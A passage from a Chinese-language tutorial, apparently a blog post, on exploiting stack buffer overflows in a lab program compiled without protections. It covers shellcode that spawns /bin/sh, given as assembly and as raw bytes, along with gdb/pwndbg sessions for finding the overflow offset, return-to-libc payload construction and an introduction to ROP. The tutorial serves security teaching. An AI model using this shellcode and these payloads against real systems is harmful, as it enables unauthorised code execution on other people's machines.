class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li><p>作为第一个漏洞利用的案例，我们不开启栈不可执行和栈canary的保护选项</p>
</li>
<li><p>argc即命令行参数个数</p>
</li>
<li><p>argv[0]即程序名字符串本身，argv[1]是第一个参数，以此类推</p>
</li>
</ol>
</blockquote>
<p>编译命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fno-stack-protector bof.c -o bof -m32</span><br></pre></td></tr></table></figure>

<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序接收命令行输入第一个参数，如果这个参数过长，strcpy时会溢出栈上缓冲区buf</p>
<table>
<thead>
<tr>
<th align="center">高地址</th>
<th align="center">char **argv</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center">int argc</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">return address</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">saved %ebp</td>
</tr>
<tr>
<td align="center">低地址</td>
<td align="center">char buf[128]</td>
</tr>
</tbody></table>
<ul>
<li>栈在内存中是从高地址到低地址增长</li>
<li>局部变量char是从低地址到高地址增长</li>
</ul>
<p>当字符串参数过长就会出现：</p>
<table>
<thead>
<tr>
<th align="center">高地址</th>
<th align="center">char **argv</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center">int argc</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">buf[132~135]</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">buf[128~131]</td>
</tr>
<tr>
<td align="center">低地址</td>
<td align="center">buf[0~127]</td>
</tr>
</tbody></table>
<p>可以把Shellcode放在返回地址之后，然后通过覆盖返回地址跳转至Shellcode</p>
<table>
<thead>
<tr>
<th align="center">高地址</th>
<th align="center">Shellcode</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center">Shellcode</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Shellcode addr</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">buf[128~131]</td>
</tr>
<tr>
<td align="center">低地址</td>
<td align="center">buf[0~127]</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : padding1 + address of shellcode + shellcode</span><br></pre></td></tr></table></figure>

<p>有一种手法可以把return address覆盖为<code>jmp esp</code>的地址，这样就不用管具体Shellcode addr的具体地址了，只要shellcode跟在<code>jmp esp</code>指令后面即可</p>
<table>
<thead>
<tr>
<th align="center">高地址</th>
<th align="center">Shellcode</th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center">Shellcode</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Shellcode addr</td>
<td align="center">jmp esp</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">buf[128~131]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">低地址</td>
<td align="center">buf[0~127]</td>
<td align="center"></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : padding1 + address of jmp esp + shellcode</span><br></pre></td></tr></table></figure>

<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>首先查看一下execve函数的原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">char</span> *<span class="keyword">const</span> argv[],cahr *<span class="keyword">const</span> envp[])</span></span></span><br></pre></td></tr></table></figure>

<p>手写64位下的shellcode代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor %eax,%eax</span><br><span class="line">pushl %eax</span><br><span class="line">push $0x68732f2f</span><br><span class="line">push $0x6e69622f</span><br><span class="line">movl %esp,%ebx</span><br><span class="line">pushl %eax</span><br><span class="line">pushl %ebx</span><br><span class="line">movl %esp,%ecx</span><br><span class="line">cltd</span><br><span class="line">movb $0xb,%al</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此处eax为0，因此cltd相当于将edx也设为0</p>
</blockquote>
<p>以上代码实现的效果就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,null,null)</span><br></pre></td></tr></table></figure>

<p>Syscall 调用约定</p>
<ul>
<li>syscall number: %eax=0xb</li>
<li>第一个参数：%ebx=filename</li>
<li>第二个参数：%ecx=argv</li>
<li>第三个参数：%edx=envp=0</li>
<li>第四个参数：%esi</li>
<li>第五个参数：%edi</li>
<li>第六个参数：%ebp</li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>用内联（inline）汇编测试编写的shellcode，也可以使用汇编器as直接编译汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _asm_(</span><br><span class="line">    <span class="string">"xor %eax,%eax\n\t"</span></span><br><span class="line">    <span class="string">"pushl %eax\n\t"</span></span><br><span class="line">    <span class="string">"push $0x68732f2f\n\t"</span></span><br><span class="line">    <span class="string">"push $0x6e69622f\n\t"</span></span><br><span class="line">    <span class="string">"movl %esp,%ebx\n\t"</span></span><br><span class="line">    <span class="string">"pushl %eax\n\t"</span></span><br><span class="line">    <span class="string">"pushl %ebx\n\t"</span></span><br><span class="line">    <span class="string">"movl %esp,%ecx\n\t"</span>  </span><br><span class="line">    <span class="string">"cltd\n\t"</span></span><br><span class="line">    <span class="string">"movb $0xb,%al\n\t"</span></span><br><span class="line">    <span class="string">"int $0x80\n\t"</span>      </span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h3><p>提取测试代码反汇编出来的机器码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d shellcode</span><br></pre></td></tr></table></figure>

<p>提取得到shellcode的指令的机器码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE = &quot;</span><br><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>

<p>所以上述代码还可以改写为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>(*f)()=(<span class="keyword">void</span>(*)())shellcode;</span><br><span class="line">    f();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>段代码中，shellcode存储在全局字符数组中，属于.data section,编译器默认其不可执行，必须加上选项-z execstack,即开启栈/堆/数据段可执行</p>
<h2 id="栈溢出漏洞利用步骤"><a href="#栈溢出漏洞利用步骤" class="headerlink" title="栈溢出漏洞利用步骤"></a>栈溢出漏洞利用步骤</h2><ol>
<li>找到能够刚好覆盖返回地址的缓冲区长度</li>
<li>填充Shellcode并找到Shellcode所在地址</li>
<li>将返回地址覆盖为Shellcode地址</li>
</ol>
<h2 id="寻找填充长度"><a href="#寻找填充长度" class="headerlink" title="寻找填充长度"></a>寻找填充长度</h2><h3 id="手动寻找"><a href="#手动寻找" class="headerlink" title="手动寻找"></a>手动寻找</h3><p>为了精确覆盖返回地址，首先要找到从缓冲区开头到栈上的返回地址有多少距离。我们可以先找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy第一个参数即可。另外，可在main函数返回前断下，此时esp指向的即是返回地址所在位置。</p>
<p>现在依然以上文的示例程序为例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/test$ gdb -q --args bof AAAA</span><br><span class="line">pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from bof...(no debugging symbols found)...done.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /home/syc/Desktop/test/bof AAAA</span><br><span class="line">argv[1]:AAAA</span><br><span class="line">[Inferior 1 (process 3282) exited normally]</span><br><span class="line"><span class="meta">pwndbg&gt;</span> disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x5655554d &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x56555551 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x56555554 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x56555557 &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x56555558 &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x5655555a &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x5655555b &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x5655555c &lt;+15&gt;:	add    esp,0xffffff80</span><br><span class="line">   0x5655555f &lt;+18&gt;:	call   0x56555450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x56555564 &lt;+23&gt;:	add    ebx,0x1a70</span><br><span class="line">   0x5655556a &lt;+29&gt;:	mov    eax,ecx</span><br><span class="line">   0x5655556c &lt;+31&gt;:	cmp    DWORD PTR [eax],0x1</span><br><span class="line">   0x5655556f &lt;+34&gt;:	jg     0x56555578 &lt;main+43&gt;</span><br><span class="line">   0x56555571 &lt;+36&gt;:	mov    eax,0x1</span><br><span class="line">   0x56555576 &lt;+41&gt;:	jmp    0x565555b1 &lt;main+100&gt;</span><br><span class="line">   0x56555578 &lt;+43&gt;:	mov    eax,DWORD PTR [eax+0x4]</span><br><span class="line">   0x5655557b &lt;+46&gt;:	add    eax,0x4</span><br><span class="line">   0x5655557e &lt;+49&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x56555580 &lt;+51&gt;:	sub    esp,0x8</span><br><span class="line">   0x56555583 &lt;+54&gt;:	push   eax</span><br><span class="line">   0x56555584 &lt;+55&gt;:	lea    eax,[ebp-0x88]</span><br><span class="line">   0x5655558a &lt;+61&gt;:	push   eax</span><br><span class="line">   0x5655558b &lt;+62&gt;:	call   0x565553e0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x56555590 &lt;+67&gt;:	add    esp,0x10</span><br><span class="line">   0x56555593 &lt;+70&gt;:	sub    esp,0x8</span><br><span class="line">   0x56555596 &lt;+73&gt;:	lea    eax,[ebp-0x88]</span><br><span class="line">   0x5655559c &lt;+79&gt;:	push   eax</span><br><span class="line">   0x5655559d &lt;+80&gt;:	lea    eax,[ebx-0x1994]</span><br><span class="line">   0x565555a3 &lt;+86&gt;:	push   eax</span><br><span class="line">   0x565555a4 &lt;+87&gt;:	call   0x565553d0 &lt;printf@plt&gt;</span><br><span class="line">   0x565555a9 &lt;+92&gt;:	add    esp,0x10</span><br><span class="line">   0x565555ac &lt;+95&gt;:	mov    eax,0x0</span><br><span class="line">   0x565555b1 &lt;+100&gt;:	lea    esp,[ebp-0x8]</span><br><span class="line">   0x565555b4 &lt;+103&gt;:	pop    ecx</span><br><span class="line">   0x565555b5 &lt;+104&gt;:	pop    ebx</span><br><span class="line">   0x565555b6 &lt;+105&gt;:	pop    ebp</span><br><span class="line">   0x565555b7 &lt;+106&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x565555ba &lt;+109&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>在调用<code>strcpy</code>和<code>ret</code>指令处下断点</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> b *0x5655558b</span><br><span class="line">Breakpoint 1 at 0x5655558b</span><br><span class="line"><span class="meta">pwndbg&gt;</span> b *0x565555ba</span><br><span class="line">Breakpoint 2 at 0x565555ba</span><br></pre></td></tr></table></figure>

<p>开始调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> r AAAA</span><br><span class="line">Starting program: /home/syc/Desktop/test/bof AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x5655558b in main ()</span><br><span class="line"> ► 0x5655558b &lt;main+62&gt;     call   strcpy@plt &lt;0x565553e0&gt;</span><br><span class="line">        dest: 0xffffced0 ◂— 0x0</span><br><span class="line">        src: 0xffffd1fd ◂— 'AAAA'</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/wx $esp</span><br><span class="line">0xffffcec0:	0xffffced0	0xffffd1fd </span><br><span class="line">//分别是strcpy的两个参数，第一个参数即为目标缓冲区0xffffced0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> c</span><br><span class="line">Continuing.</span><br><span class="line">argv[1]:AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x565555ba in main ()</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/wx $esp</span><br><span class="line">0xffffcf6c:	0xf7df4e81</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/d 0xffffcf6c - 0xffffced0</span><br><span class="line"><span class="meta">$</span>1 = 156</span><br></pre></td></tr></table></figure>

<ul>
<li>在第一个断点处，找到缓冲区起始地址为0xffffced0</li>
<li>2在第二个断点处，找到缓冲区起始地址为0xffffcf6c</li>
<li>二者相减可以知道溢出超过140字节时会覆盖返回地址</li>
</ul>
<h3 id="pwntools之cyclic"><a href="#pwntools之cyclic" class="headerlink" title="pwntools之cyclic"></a>pwntools之cyclic</h3><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置</p>
<p>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。<br>用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串</span><br><span class="line">cyclic_find(0x61616161) # 找到该数据在pattern中的位置</span><br><span class="line">cyclic_find(&apos;aaaa&apos;) # 查找位置也可以使用字符串去定位</span><br></pre></td></tr></table></figure>

<p>比如，我们在栈溢出的时候，首先构造cyclic(0x100)，或者更长长度的pattern，进行输入，输入后pc的值变味了0x61616161，那么我们通过cyclic_find(0x61616161)就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算</p>
<h2 id="Return-to-Libc"><a href="#Return-to-Libc" class="headerlink" title="Return to Libc"></a>Return to Libc</h2><p>发生栈溢出时，不跳转到shellcode，而实跳转到libc中的函数</p>
<h3 id="简单的一个函数"><a href="#简单的一个函数" class="headerlink" title="简单的一个函数"></a>简单的一个函数</h3><p>以调用system函数为例的栈布局</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">0</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center">“/bin/sh”</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">exit</td>
</tr>
<tr>
<td align="center">return addr</td>
<td align="center">system</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">padding</td>
</tr>
</tbody></table>
<p>system返回时，栈上对应的返回地址为exit()函数，进而执行exit(0)，所以相当于执行了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>简单来说就是：</p>
<ul>
<li>获得system()和exit()的函数地址</li>
<li>获得”/bin/sh”字符串地址</li>
<li>构造溢出载荷<ul>
<li>system + exit + “bin/sh” + 0</li>
</ul>
</li>
<li>实验在关闭ASLR情况下进行，libc函数地址固定不变</li>
</ul>
<h4 id="获得system-和exit-的函数地址"><a href="#获得system-和exit-的函数地址" class="headerlink" title="获得system()和exit()的函数地址"></a>获得system()和exit()的函数地址</h4><ul>
<li>可以在GDB中直接使用print命令查看</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> print system</span><br><span class="line"><span class="meta">$</span>1 = &#123;int (const char *)&#125; 0xf7e19200 &lt;__libc_system&gt;</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p exit</span><br><span class="line"><span class="meta">$</span>2 = &#123;void (int)&#125; 0xf7e0c3d0 &lt;__GI_exit&gt;</span><br></pre></td></tr></table></figure>

<h4 id="获得”-bin-sh”字符串地址"><a href="#获得”-bin-sh”字符串地址" class="headerlink" title="获得”/bin/sh”字符串地址"></a>获得”/bin/sh”字符串地址</h4><p>glibc中必定有字符串”/bin/sh”，可以使用GDB中的find命令，在libc的内存范围内搜索</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x56555000 0x56556000 r-xp     1000 0      /home/syc/Desktop/test/bof</span><br><span class="line">0x56556000 0x56557000 r-xp     1000 0      /home/syc/Desktop/test/bof</span><br><span class="line">0x56557000 0x56558000 rwxp     1000 1000   /home/syc/Desktop/test/bof</span><br><span class="line">0xf7ddc000 0xf7fb1000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb1000 0xf7fb2000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb2000 0xf7fb4000 r-xp     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 rwxp     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb5000 0xf7fb8000 rwxp     3000 0      </span><br><span class="line">0xf7fd0000 0xf7fd2000 rwxp     2000 0      </span><br><span class="line">0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 25000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 26000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line"><span class="meta">pwndbg&gt;</span> find /b 0xf7ddc000, 0xf7fb5000,'/','b','i','n','/','s','h',0</span><br><span class="line">0xf7f5a0cf</span><br><span class="line">1 pattern found.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/s 0xf7f5a0cf</span><br><span class="line">0xf7f5a0cf:	"/bin/sh"</span><br></pre></td></tr></table></figure>

<p>0xf7ddc000是libc起始地址，0xf7fb5000是结尾地址</p>
<h4 id="获取地址的另一种方法"><a href="#获取地址的另一种方法" class="headerlink" title="获取地址的另一种方法"></a>获取地址的另一种方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/test$ ldd bof</span><br><span class="line">	linux-gate.so.1 (0xf7eff000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d03000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f00000)</span><br><span class="line">syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system</span><br><span class="line">   ...</span><br><span class="line">  1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br><span class="line">syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit</span><br><span class="line">   ...</span><br><span class="line">   147: 000303d0    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0</span><br><span class="line">   ...</span><br><span class="line">syc@ubuntu:~/Desktop/test$ strings -tx  /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</span><br><span class="line"> 17e0cf /bin/sh</span><br><span class="line"> syc@ubuntu:~/Desktop/test$ gdb -q</span><br><span class="line">pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x0003d200</span><br><span class="line"><span class="meta">$</span>1 = 0xf7d40200</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x000303d0</span><br><span class="line"><span class="meta">$</span>2 = 0xf7d333d0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x017e0cf</span><br><span class="line"><span class="meta">$</span>3 = 0xf7e810cf</span><br></pre></td></tr></table></figure>

<ul>
<li>首先用ldd命令获取libc基址</li>
<li>然后用readelf命令找到system和exit函数在libc中的偏移</li>
<li>用strings命令找到字符串/bin/sh在libc中的偏移</li>
<li>最后通过与libc基址相加来获得最终地址</li>
</ul>
<p>有时候我们会发现”/bin/sh”的地址中包含换行符0a，argv[1]会被换行符截断，解决方案：使用”sh\0”</p>
<p>可以更换一个命令字符串，一般来说PATH环境变量中已经包含/bin目录，因此只需要找到一个”sh”字符串，将其地址作为system()函数的参数即可。</p>
<p>我们在程序自身空间内就可以找到”sh”这个字符串，同样使用find命令。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> find /b 0xf7ddc000, 0xf7fb5000, 's','h',0</span><br><span class="line">0xf7deacd3</span><br><span class="line">0xf7dead32</span><br><span class="line">0xf7debe59</span><br><span class="line">0xf7dec4ac</span><br><span class="line">0xf7dee4f6</span><br><span class="line">0xf7dee5d3</span><br><span class="line">0xf7deee85</span><br><span class="line">0xf7def172</span><br><span class="line">0xf7f573b5 &lt;__re_error_msgid+117&gt;</span><br><span class="line">0xf7f57dc1 &lt;afs.8574+193&gt;</span><br><span class="line">0xf7f5a0d4</span><br><span class="line">0xf7f5bacd</span><br><span class="line">12 patterns found.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/s 0xf7deacd3</span><br><span class="line">0xf7deacd3:	"sh"</span><br></pre></td></tr></table></figure>

<h2 id="Return-to-PLT"><a href="#Return-to-PLT" class="headerlink" title="Return to PLT"></a>Return to PLT</h2><ul>
<li>如果动态共享库的地址随机化保护开启，则无法知道libc地址</li>
<li>而程序中已经引用的动态库函数，可以直接通过PLT调用，无需知道实际地址</li>
</ul>
<h2 id="重新思考Return-to-Libc"><a href="#重新思考Return-to-Libc" class="headerlink" title="重新思考Return to Libc"></a>重新思考Return to Libc</h2><ul>
<li>利用Return to Libc，我们调用了system(“/bin/sh”)和exit(0)</li>
<li>system()和exit()函数本质上都是以ret指令结尾的代码片段</li>
<li>那如果其他ret结尾的代码片段呢？例如几条指令组成的小代码片段。同样可行！</li>
</ul>
<h2 id="ROP（Return-Oriented-Programming）"><a href="#ROP（Return-Oriented-Programming）" class="headerlink" title="ROP（Return Oriented Programming）"></a>ROP（Return Oriented Programming）</h2><ul>
<li>通过拼接以ret指令结尾的代码片段来实现某些功能的技术，称为ROP</li>
<li>以ret指令结尾的小段代码片段我们称为ROP gadget：例如：pop edx;ret</li>
<li>为实现某-功能拼接而成的多个ROP gadget,我们称为ROP链(ROP Chain）</li>
<li>在栈上(从返回地址开始)填充的用于执行ROP链的数据，我们称为ROP载荷(ROP Payload)</li>
<li>ROP技术是Return to libc的扩 展，Return to libc是ROP的一 种特殊情况，即ROP gadget恰好是libc函数的情形</li>
</ul>
<h2 id="ROP的扩展-JOP、COP"><a href="#ROP的扩展-JOP、COP" class="headerlink" title="ROP的扩展-JOP、COP"></a>ROP的扩展-JOP、COP</h2><ul>
<li>换汤不换药，把使用的的代码片段从ret结尾拓展到jmp/call结尾</li>
<li>JOP（Jump Oriented Programming）<ul>
